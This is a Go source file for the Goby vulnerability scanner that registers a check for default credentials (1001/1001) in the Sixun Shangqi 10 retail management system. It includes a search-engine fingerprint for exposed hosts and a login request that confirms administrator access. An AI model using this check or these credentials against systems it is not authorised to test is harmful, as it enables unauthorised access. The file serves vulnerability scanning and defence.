package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Sunshangqi 10 Business Management System /api/Login/Login Weak Password Vulnerability",
    "Description": "<p>Sixunshangqi 10 is a new retail management system, developed by Shenzhen Sixun Software Co., Ltd. The system is based on the Internet architecture and aims to solve various challenges in the process of informatization of the traditional retail industry, such as the limitations of business coverage, the lag of data transmission and the constraints of block management.</p><p> There is a default password in the business management system of Sixun Shangqi 10, and attackers can use the default password: 1001/1001 to log in to the system. Default or weak passwords are passwords that can be easily guessed or cracked, such as simple combinations of numbers or common names. They pose a serious threat to personal privacy and information security, which can lead to the theft of bank accounts, the control of computers, or the hacking of information systems. To protect against these risks, it's recommended to use strong passwords, including uppercase and lowercase letters, numbers, and special characters, avoid using personal information, and change passwords regularly.</p>",
    "Product": "Sunshangqi 10 Business Management System",
    "Homepage": "http://sq.sissyun.com/",
    "DisclosureDate": "2024-05-15",
    "PostTime": "2024-05-15",
    "Author": "2974057526@qq.com",
    "FofaQuery": "body=\"Content/mainFrame/index.css\"",
    "GobyQuery": "body=\"Content/mainFrame/index.css\"",
    "Level": "2",
    "Impact": "<p>There is a default password in the business management system of Sixun Shangqi 10, and attackers can use the default password: 1001/1001 to log in to the system. Default or weak passwords are passwords that can be easily guessed or cracked, such as simple combinations of numbers or common names. They pose a serious threat to personal privacy and information security, which can lead to the theft of bank accounts, the control of computers, or the hacking of information systems. To protect against these risks, it's recommended to use strong passwords, including uppercase and lowercase letters, numbers, and special characters, avoid using personal information, and change passwords regularly.</p>",
    "Recommendation": "<p>To avoid using weak passwords, we recommend that you follow these guidelines when setting strong passwords: </p><p>Don't use empty passwords or system-default passwords. The password should be 8-15 characters long and case-sensitive. Passwords should contain uppercase letters, lowercase letters, numbers, and special characters, with at least one of each type of character. The password should not contain 4 repetitive numbers or letters, nor should it contain 4 consecutive numbers.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/Login/Login",
                "follow_redirect": false,
                "header": {
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "38"
                },
                "data_type": "text",
                "data": "id=1001&password=1001&onlineQuery=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"operName\":\"管理员\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{scheme}}}://1001@1001:{{{hostinfo}}}/api/Login/Login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "思迅商旗10商业管理系统 /api/Login/Login 默认口令漏洞",
            "Product": "思迅商旗10商业管理系统",
            "Description": "<p>思迅商旗10是一款全新的零售管理系统，由深圳市思迅软件股份有限公司开发。该系统基于互联网架构，旨在解决传统零售业在信息化进程中的各种挑战，如业态覆盖的局限性、数据传输的滞后性和区块管理的制约性。</p><p>思迅商旗10商业管理系统存在默认口令，攻击者可利用默认口令：1001/1001登录系统默认口令或弱口令是容易被猜解或破解的密码，如简单的数字组合或常见姓名。它们对个人隐私和信息安全构成严重威胁，可能导致银行账户被盗、电脑被控制或信息系统被黑客攻击。为防范这些风险，建议使用强密码，包括大小写字母、数字和特殊字符，避免使用个人信息，并定期更换密码。</p>",
            "Recommendation": "<p>为了避免使用弱口令，建议遵循以下原则来设置强密码：&nbsp;</p><p>不使用空密码或系统默认的密码。密码应由8-15个字符组成，区分大小写。密码应该包含大写字母、小写字母、数字和特殊字符，每类字符至少包含一个。密码不应包含4个重复的数字或字母，也不应包含4个连续的数字。<br></p>",
            "Impact": "<p>思迅商旗10商业管理系统存在默认口令，攻击者可利用默认口令：1001/1001登录系统。默认口令或弱口令是容易被猜解或破解的密码，如简单的数字组合或常见姓名。它们对个人隐私和信息安全构成严重威胁，可能导致银行账户被盗、电脑被控制或信息系统被黑客攻击。为防范这些风险，建议使用强密码，包括大小写字母、数字和特殊字符，避免使用个人信息，并定期更换密码。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Sunshangqi 10 Business Management System /api/Login/Login Weak Password Vulnerability",
            "Product": "Sunshangqi 10 Business Management System",
            "Description": "<p>Sixunshangqi 10 is a new retail management system, developed by Shenzhen Sixun Software Co., Ltd. The system is based on the Internet architecture and aims to solve various challenges in the process of informatization of the traditional retail industry, such as the limitations of business coverage, the lag of data transmission and the constraints of block management.</p><p>&nbsp;There is a default password in the business management system of Sixun Shangqi 10, and attackers can use the default password: 1001/1001 to log in to the system. Default or weak passwords are passwords that can be easily guessed or cracked, such as simple combinations of numbers or common names. They pose a serious threat to personal privacy and information security, which can lead to the theft of bank accounts, the control of computers, or the hacking of information systems. To protect against these risks, it's recommended to use strong passwords, including uppercase and lowercase letters, numbers, and special characters, avoid using personal information, and change passwords regularly.<span></span></p>",
            "Recommendation": "<p>To avoid using weak passwords, we recommend that you follow these guidelines when setting strong passwords:&nbsp;</p><p>Don't use empty passwords or system-default passwords. The password should be 8-15 characters long and case-sensitive. Passwords should contain uppercase letters, lowercase letters, numbers, and special characters, with at least one of each type of character. The password should not contain 4 repetitive numbers or letters, nor should it contain 4 consecutive numbers.</p>",
            "Impact": "<p>There is a default password in the business management system of Sixun Shangqi 10, and attackers can use the default password: 1001/1001 to log in to the system. Default or weak passwords are passwords that can be easily guessed or cracked, such as simple combinations of numbers or common names. They pose a serious threat to personal privacy and information security, which can lead to the theft of bank accounts, the control of computers, or the hacking of information systems. To protect against these risks, it's recommended to use strong passwords, including uppercase and lowercase letters, numbers, and special characters, avoid using personal information, and change passwords regularly.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}